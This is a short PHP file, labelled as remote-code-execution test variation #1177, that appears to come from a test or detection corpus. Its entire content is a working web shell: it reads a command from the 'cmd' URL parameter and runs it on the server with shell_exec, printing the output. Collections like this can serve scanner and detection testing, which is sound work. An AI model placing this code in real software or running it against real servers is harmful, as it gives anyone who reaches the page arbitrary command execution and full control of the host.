<?php
// RCE test variation #1177
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>